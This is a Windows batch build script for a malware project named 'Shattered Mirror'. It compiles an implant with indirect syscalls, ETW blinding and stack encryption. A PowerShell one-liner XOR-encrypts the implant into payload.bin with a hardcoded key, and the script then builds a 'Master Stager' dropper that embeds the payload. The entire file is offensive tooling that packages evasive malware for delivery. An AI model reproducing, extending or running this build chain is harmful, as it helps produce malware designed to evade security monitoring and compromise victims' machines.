@echo off
SET "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist "%VSWHERE%" (
  echo [!] vswhere.exe not found. Install VS Build Tools.
  exit /b 1
)
for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VS_INSTALL=%%i"
if not defined VS_INSTALL (
  echo [!] No VS installation with C++ tools found.
  exit /b 1
)
SET "VS_PATH=%VS_INSTALL%\VC\Auxiliary\Build\vcvars64.bat"
if not exist "%VS_PATH%" ( echo [!] vcvars64.bat not found! && exit /b 1 )
call "%VS_PATH%"

echo [*] Compiling Shattered Mirror CORE (ShatteredCore.exe)...
if not exist "build" mkdir build
rc.exe /nologo /i Orchestrator /fo build\resources.res Orchestrator\resources.rc
echo [*] Assembling Indirect Syscalls...
ml64 /c /Fo build\IndirectSyscalls.obj Evasion_Suite\IndirectSyscalls.asm
cl.exe /EHsc /O2 /GS- /I . /I Evasion_Suite\include /Fo:build\ ^
Orchestrator\ProxyLogic.cpp Orchestrator\VEH_Handler.cpp Orchestrator\AtomManager.cpp Orchestrator\IPC_Channel.cpp  ^
Evasion_Suite\src\indirect_syscall.cpp Evasion_Suite\src\etw_blind.cpp Evasion_Suite\src\stack_encrypt.cpp  Atoms\Atom_01_*.cpp Atoms\Atom_02_*.cpp Atoms\Atom_03_*.cpp Atoms\Atom_04_*.cpp Atoms\Atom_05_*.cpp Atoms\Atom_06_*.cpp Atoms\Atom_07_*.cpp Atoms\Atom_08_*.cpp Atoms\Atom_09_*.cpp Atoms\Atom_10_*.cpp Atoms\Atom_11_*.cpp Atoms\Atom_12_*.cpp Atoms\Atom_13_*.cpp Atoms\Atom_14_*.cpp  build\IndirectSyscalls.obj  build\resources.res ^
user32.lib advapi32.lib shell32.lib ole32.lib bcrypt.lib winhttp.lib  ^
/Fe:ShatteredCore.exe

echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...
powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('J3BVEfVwvkn0hOwI');$last=0;for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor ($k[$i %% $k.Length] -bxor $last);$last=$b[$i]};[IO.File]::WriteAllBytes('payload.bin',$b)"

if not exist "payload.bin" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )
echo [*] Packaging Resources...
rc.exe /nologo /i Builder_GUI /fo build\dropper.res Builder_GUI\dropper.rc
echo [*] Compiling Master Stager (Dropper.exe)...
cl.exe /EHsc /O2 /GS- /Fo:build\ Builder_GUI\Dropper_Template.cpp build\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe
echo [*] Build step status: %errorlevel%
exit /b 0
